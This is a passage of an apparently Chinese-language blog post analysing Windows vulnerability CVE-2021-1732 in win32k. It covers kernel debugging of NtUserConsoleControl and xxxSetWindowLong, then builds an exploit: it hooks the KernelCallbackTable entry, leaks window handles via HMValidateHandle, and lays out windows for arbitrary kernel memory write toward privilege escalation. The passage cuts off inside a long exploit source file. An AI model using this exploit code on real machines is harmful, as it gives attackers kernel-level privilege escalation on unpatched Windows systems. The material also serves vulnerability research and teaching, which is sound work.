class="string">&quot;NtUserConsoleControl&quot;</span>);</span><br><span class="line"></span><br><span class="line">    g_pfnNtUserConsoleControl(<span class="number">6</span>i64, &amp;hwnd, <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (GetMessage(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        TranslateMessage(&amp;msg);</span><br><span class="line">        DispatchMessage(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先win32kfull!NtUserConsoleControl打上断点。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; ba e1 win32kfull!NtUserConsoleControl</span><br><span class="line">1: kd&gt; bl</span><br><span class="line">     0 e Disable Clear  fffff285`828e0440 e 1 0001 (0001) win32kfull!NtUserConsoleControl</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/04/10/RUbKkFg61tuEoJ7.png" alt="8.png"></p>
<p>进入xxxConsoleControl，可以看到如果dwExtraFlag &amp; 0x800 ==0，就会采用申请内存桌面堆内存的方式，然后计算到桌面堆基址的偏移，赋值给pExtraBytes，然后将dwExtraFlag |0x800。<br><img src="https://s2.loli.net/2023/04/10/c6KrHGM4ElpiAQB.png" alt="9.png"></p>
<p>其中这个dwExtraFlag标志，对漏洞利用十分关键，因为其决定了后面调用SetWindowLong函数，其寻址方式，是寻找申请的用户空间内存的地址，还是寻找内核桌面堆的地址。</p>
<h4 id="SetWindowLong调试"><a href="#SetWindowLong调试" class="headerlink" title="SetWindowLong调试"></a>SetWindowLong调试</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG <span class="title">SetWindowLongA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  [in] HWND hWnd,	<span class="comment">//窗口的句柄，间接地是窗口所属的类。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] <span class="keyword">int</span>  nIndex,	<span class="comment">//要设置的值的从零开始的偏移量。</span></span></span></span><br><span class="line"><span class="function"><span class="params">  [in] LONG dwNewLong	<span class="comment">//替换值。</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>这个函数是用来向我们CreateWindows时，对申请的额外空间内存进行赋值操作的，前提是窗口类结构体的cbWndExtra不为0。<br>采用下面的代码，然后调试，通过系统调用号的查找，完全可以定位到内核调用的函数为 win32kfull!NtUserSetWindowLong，打上断点，开始调试。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 窗口类的窗口过程函数(负责消息处理) */</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">MyWndProc</span><span class="params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> DefWindowProc(hWnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 程序入口点 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(_In_ HINSTANCE hInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_opt_ HINSTANCE hPrevInstance,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ LPSTR     lpCmdLine,</span></span></span><br><span class="line"><span class="function"><span class="params">    _In_ <span class="keyword">int</span>       nCmdShow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HWND hwnd;</span><br><span class="line">    MSG msg;</span><br><span class="line">    WNDCLASSEX wndclass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    wndclass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEX);</span><br><span class="line">    wndclass.style = CS_HREDRAW | CS_VREDRAW;</span><br><span class="line">    wndclass.lpfnWndProc = MyWndProc;</span><br><span class="line">    wndclass.hInstance = hInstance;</span><br><span class="line">    wndclass.lpszClassName = (LPWSTR)<span class="string">L&quot;Itach1&quot;</span>;</span><br><span class="line">    <span class="comment">/* 使用 cbWndExtra 字段，设置扩展内存大小为两个 long long */</span></span><br><span class="line">    wndclass.cbWndExtra = <span class="number">2</span> * <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>);</span><br><span class="line"></span><br><span class="line">    RegisterClassEx(&amp;wndclass);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hwnd = CreateWindowEx(</span><br><span class="line">        <span class="literal">NULL</span>, <span class="string">L&quot;Itach1&quot;</span>, <span class="string">L&quot;Itach1&quot;</span>,</span><br><span class="line">        WS_OVERLAPPEDWINDOW | WS_VISIBLE,</span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">        CW_USEDEFAULT, CW_USEDEFAULT,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对申请的额外内存的偏移8的位置进行赋值。</span></span><br><span class="line">    SetWindowLong(hwnd, <span class="number">8</span>, <span class="number">0xBBBBBBBBBBBBBBBB</span>);</span><br><span class="line">    <span class="keyword">while</span> (GetMessage(&amp;msg, hwnd, <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        TranslateMessage(&amp;msg);</span><br><span class="line">        DispatchMessage(&amp;msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> msg.wParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ValidateHwndEx返回tagWND结构体指针，后续调用win32full!xxxSetWindowLong，前三个参数就是我们调用SetWindowLong的三个参数，区别是第一个参数变成了ptagWND结构体指针。</p>
<p><img src="https://s2.loli.net/2023/04/10/HOUyuj8EBzRqtFh.png" alt="10.png"></p>
<p>然后进入xxxSetWindowLong，首先需要对参数nIndex进行一些判断，首先不能&lt;0，然后肯定也不能超过当时定义窗口类的额外空间大小。</p>
<p><img src="https://s2.loli.net/2023/04/10/tih92ySkIbKnmXd.png" alt="11.png"></p>
<p>主要满足两个点，但是这里的FC偏移处到底代表啥呢，在什么条件就不为0了呢。</p>
<ul>
<li>nIndex&lt;0</li>
<li>nIndex+4 &lt; cbWndExtra，这里为什么+4也很好理解，因为nIndex是long类型，4个字节，要赋值，所以最大能赋值的地址，肯定需要比最后的地址小4。</li>
</ul>
<p>继续调试，到了找地址的地方，然后赋值了。<br><img src="https://s2.loli.net/2023/04/10/rNo6lQ7cmCEbd9u.png" alt="12.png"></p>
<p>可以看到有两种找到最终地址的方式，实际上就是上面调试两个函数提到的方式，主要的判断方式还是为dwExtraFlag &amp; 0x800 是否为0。</p>
<ul>
<li>dwExtraFlag &amp; 0x800 !=0时，采用桌面堆寻址方式，最终地址=pExtraBytes + nIndex + DeskHeapBase。</li>
<li>dwExtraFlag &amp; 0x800 ==0时，采用用户空间寻址，也就是CreateWindowsEx函数中，我们调用xxxClientAllocWindowClassExtraBytes申请到的空间地址+nIndex。</li>
</ul>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>上面分析了这么多函数，现在也能轻易的明白漏洞点了，漏洞点就在于xxxSetWindowLong()函数的两种寻址方式上，大部分正常情况下，我们都是使用的xxxClientAllocWindowClassExtraBytes函数申请的内存，然后进行赋值，但是这个函数实际上是在用户层申请的内存空间，我们可以hook这个函数，而且恰巧的是，存在ConsoleControl这个函数，让我们可以修改dwExtraFlag，这将导致xxxSetWindowLong()函数的寻址方式改为寻找内核桌面堆的某块地址，如果再可以修改nIndex或者pExtraBytes的值，就可以实现对内核的某块地址进行赋值操作。</p>
<p>当然漏洞点是简单，容易理解的，但是我们最终的目标是利用，实现提权的操作，想做到这点还需要解决一系列问题</p>
<ul>
<li><p>首先是如何hookxxxClientAllocWindowClassExtraBytes的那个用户层回调函数。</p>
</li>
<li><p>然后是ConsoleControl函数，这个函数的参数需要窗口的句柄，但是我们往往调用的时候是需要再CreateWindowsEx中hook掉xxxClientAllocWindowClassExtraBytes进行调用ConsoleControl，这时候还没有窗口句柄。</p>
</li>
<li><p>其次是如何利用漏洞点，让我们可以随便修改或者读取我们想要的内存。</p>
</li>
<li><p>对于这种任意地址读写的漏洞，该如何实现提权。</p>
</li>
</ul>
<p>这些问题还得需要从exp，从代码中找到答案。</p>
<h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><h3 id="Hook-xxxClientAllocWindowClassExtraBytes"><a href="#Hook-xxxClientAllocWindowClassExtraBytes" class="headerlink" title="Hook xxxClientAllocWindowClassExtraBytes"></a>Hook xxxClientAllocWindowClassExtraBytes</h3><p>这里个人感觉应该是有多种hook方式的，exp采用的方式是修改KernelCallbackTable的函数地址来达到hook的目的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hook  xxxClientAllocWindowClassExtraBytes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//获取 KernelCallbackTable gs段寄存器 0x60位置为PEB</span></span><br><span class="line"><span class="comment">// PEB 偏移0x58位置为KernelCallbackTable</span></span><br><span class="line">DWORD64	KernelCallbackTable = *(DWORD64*)(__readgsqword(<span class="number">0x60</span>u) + <span class="number">0x58</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 0x3d8位置为函数 user32!_xxxClientAllocWindowClassExtraBytes:</span></span><br><span class="line">g_oldxxxClientAllocWindowClassExtraBytes = (fnxxxClientAllocWindowClassExtraBytes)*(DWORD64*)(KernelCallbackTable + <span class="number">0x3D8</span>);<span class="comment">// 0x3d8位置为函数</span></span><br><span class="line"></span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line">VirtualProtect((LPVOID)(KernelCallbackTable + <span class="number">0x3D8</span>), <span class="number">0x300</span>ui64, <span class="number">0x40</span>u, &amp;dwOldProtect);</span><br><span class="line">*(DWORD64*)(KernelCallbackTable + <span class="number">0x3D8</span>) = (DWORD64)g_newxxxClientAllocWindowClassExtraBytes;</span><br><span class="line">VirtualProtect((LPVOID)(KernelCallbackTable + <span class="number">0x3D8</span>), <span class="number">0x300</span>ui64, dwOldProtect, &amp;dwOldProtect);</span><br></pre></td></tr></table></figure>

<p>我们自己也需要重写一下_xxxClientAllocWindowClassExtraBytes。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD64  <span class="title">g_newxxxClientAllocWindowClassExtraBytes</span><span class="params">(DWORD64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD64 dwTemp = *a1;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (dwTemp == g_nRandom)</span><br><span class="line">	&#123;</span><br><span class="line">		g_offset_0x1 = <span class="number">1</span>;</span><br><span class="line">		HWND hwndMagic = GuessHwnd(&amp;g_qwMinBaseAddress, g_qwRegionSize);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;MagciHwnd==%p\r\n&quot;</span>, hwndMagic);</span><br><span class="line">		<span class="keyword">if</span> (hwndMagic)</span><br><span class="line">		&#123;</span><br><span class="line">			g_pfnNtUserConsoleControl(<span class="number">6</span>i64, &amp;hwndMagic,<span class="number">0x10</span>);</span><br><span class="line">			QWORD qwRet = g_Thrdeskhead_cLockobj_Min;</span><br><span class="line">			g_pfnNtCallbackReturn(&amp;qwRet, <span class="number">24</span>i64, <span class="number">0</span>i64);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	DWORD64 dwTest = *((PULONG64)*(a1 - <span class="number">11</span>));</span><br><span class="line">	<span class="keyword">return</span> g_oldxxxClientAllocWindowClassExtraBytes(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用就是如果是magic类的窗口，就钩取，执行UserConsoleControl()，改变此窗口的寻址模式，变为内核桌面堆寻址，其中UserConsoleControl()参数窗口句柄后面来讲如何获取。</p>
<h3 id="获取窗口句柄"><a href="#获取窗口句柄" class="headerlink" title="获取窗口句柄"></a>获取窗口句柄</h3><p>获取窗口句柄需要用到一个技术——HMValidateHandle技术，这个技术再Windows10 RS4前，都可以使用。</p>
<p>HMValidateHandle 是<code>user32.dll</code>的一个导出函数. 它以一个句柄和一个句柄类型作为参数，通过查找句柄表，如果句柄与类型匹配，它将把对象复制到用户内存中。如果对象包含一个指向自身的指针，就像<code>tagWND</code>它可以用来从内核中泄漏内存地址。</p>
<p>先来看看tagWND结构体是如何初始化的，通过CreateWindowsEx的调试，我们知道，是通过win32kbase!HMAllocObject来初始化的，分析下这个函数。</p>
<p><img src="https://s2.loli.net/2023/04/10/8fPHjpVQBaqwJ3Y.png" alt="13.png"></p>
<p><img src="https://s2.loli.net/2023/04/10/xS8P9eW2du3la1R.png" alt="14.png"></p>
<p>这些可以帮助我们更理解tagWND这个结构体，而且这个内核对象确实也包含了一个指向自己的指针，满足HMValidateHandle技术的使用条件，而且这个函数是在xxxClientAllocWindowClassExtraBytes前调用的，这代表在xxxClientAllocWindowClassExtraBytes调用前，tagWND内核对象的内存已经分配好了，配合HMValidateHandle技术，就可以泄露出tagWND结构体成员中的hwnd，就可以调用UserConsoleControl()了。</p>
<p>所以大概步骤如下</p>
<ul>
<li>首先获取HMValidateHandle函数的地址。</li>
<li>然后创建一些normal窗口，调用HMValidateHandle传入窗口句柄，其会将内核对象复制到用户内存，根据代码来看，实际上返回的是ptagWNDk，通过VirtualQuery函数检索对应地址的页面内存信息。</li>
<li>接下来销毁掉一些窗口，留下对我们漏洞利用需要的两个normal窗口，至于其他的就先销毁掉，再次创建一个magic窗口，就会使用这些毁掉的窗口内存，感觉有点linux中fast bin那种味道。</li>
<li>这个magic窗口的cbWndExtra是和normal窗口不同的，在hook _xxxClientAllocWindowClassExtraBytes函数时，可以通过这个来判断那些窗口需要hook。</li>
<li>创建magic窗口，触发hook，检索我们销毁那些窗口的页面内存信息，找到magic窗口的特征cbWndExtra，从而定位到magic窗口的hwnd。</li>
</ul>
<p>代码到内存布局在展示出来。</p>
<h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>我们需要精心构造内存布局，让我们完成读写内存的操作，读完代码会发现，真的非常巧妙。</p>
<h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>我们需要3个窗口，标号为0,1,2。</p>
<ul>
<li>第0个窗口，是normal窗口，但是在其创建好后，调用ConsoleControl修改其寻址方式。</li>
<li>第1个窗口，是normal窗口，不改变其寻址方式，最后我们将通过这个窗口来实现任意地址读。</li>
<li>第2个窗口，magic窗口，会被hook，hook时，会调用ConsoleControl修改其寻址方式。</li>
</ul>
<p>接下来，操作这3个窗口的内存，步骤如下。</p>
<ul>
<li>创建magic窗口2过程中， tagWNDk2.pExtraBytes的值是未知的，但可以知道是基于内核桌面堆的一个偏移值，代表窗口2的扩展内存相对于桌面堆的偏移，但是，为了能控制窗口1的tagWNDk0空间，我们需要将其修改为ptagWNDk0-&gt;OffsetToDesktopHeap，这个值我们是可以通过HMValidateHandle技术泄露出来的，我们在hook过程中通过控制NtCallbackReturn函数，修改tagWNDk2.pExtraBytes为ptagWNDk0-&gt;OffsetToDesktopHeap，此时窗口2的扩展内存变成了窗口0的tagWNDk</li>
<li>现在我们可以通过窗口2访问窗口0的tagWNDk0，这时候我们先修改ptagWNDk0-&gt;pExtraBytes为ptagWNDk自身相对于桌面堆的偏移，断掉窗口0的扩展内存，因为通过这个扩展内存偏移我们无法去访问其他窗口的内存。我们等下的目的是能通过窗口0，去访问窗口1的tagWNDk1空间。但是现在有个问题窗口0访问不到窗口1的tagWNDk1，但是我们知道访问大小限制是通过cbWndExtra决定的，所以我们可以先通过窗口2修改ptagWNDk0-&gt;cbWndExtra。</li>
<li>OK，没了大小限制，现在我们可以通过窗口0去修改窗口1的tagWNDk1.pExtraBytes，随意设置要修改的内存地址，而且窗口1的寻址方式是正常的，窗口1调用SetWindowLongPtrA，设置好要修改的值，就可以修改任意地址的值了。</li>
</ul>
<p>这里画了张图片，方便理解，这里我默认窗口0在上面，真实情况不一定，但是貌似内核桌面堆的扩展内存好像都偏上。</p>
<p><img src="https://s2.loli.net/2023/04/10/TgcBOpZmwKGol51.png" alt="20.png"></p>
<p>测试代码如下，目的是修改一个数的值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">void</span>* (NTAPI* lHMValidateHandle)(HANDLE h, <span class="keyword">int</span> type);</span><br><span class="line">lHMValidateHandle pHmValidateHandle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD64</span><span class="params">(NTAPI* fnxxxClientAllocWindowClassExtraBytes)</span><span class="params">(DWORD64* a1)</span></span>;</span><br><span class="line">fnxxxClientAllocWindowClassExtraBytes OldxxxClientAllocWindowClassExtraBytes = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD64</span><span class="params">(NTAPI* fnNtUserConsoleControl)</span><span class="params">(<span class="keyword">int</span> nConsoleCommand, HWND* pHwnd, <span class="keyword">int</span> nConsoleInformationLength)</span></span>;</span><br><span class="line">fnNtUserConsoleControl g_pfnNtUserConsoleControl = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD64</span><span class="params">(NTAPI* fnNtCallbackReturn)</span><span class="params">(DWORD64* a1, DWORD64 a2, DWORD64 a3)</span></span>;</span><br><span class="line">fnNtCallbackReturn g_pfnNtCallbackReturn = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> CVE_2021_1732</span><br><span class="line">&#123;</span><br><span class="line">	DWORD64 g_nRandom = <span class="number">0</span>;</span><br><span class="line">	HWND g_hwnd[<span class="number">10</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">	HWND g_hwndMagic = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD64 g_ptagWNDk[<span class="number">10</span>] = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">	DWORD64 g_ptagWNDK_min = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD64 g_ptagWNDK_max = <span class="literal">NULL</span>;</span><br><span class="line">	HWND g_hwnd_min = <span class="literal">NULL</span>;</span><br><span class="line">	HWND g_hwnd_max = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD OffsetToDesktopHeap_min = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD OffsetToDesktopHeap_max = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD64 g_qwMinBaseAddress = <span class="number">0</span>;</span><br><span class="line">	DWORD64 g_qwRegionSize = <span class="number">0</span>;</span><br><span class="line">	DWORD testnum = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> CVE_2021_1732;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">FindHMValidateHandle</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	HMODULE hUser32 = LoadLibraryA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (hUser32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to load user32&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, <span class="string">&quot;IsMenu&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (pIsMenu == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span 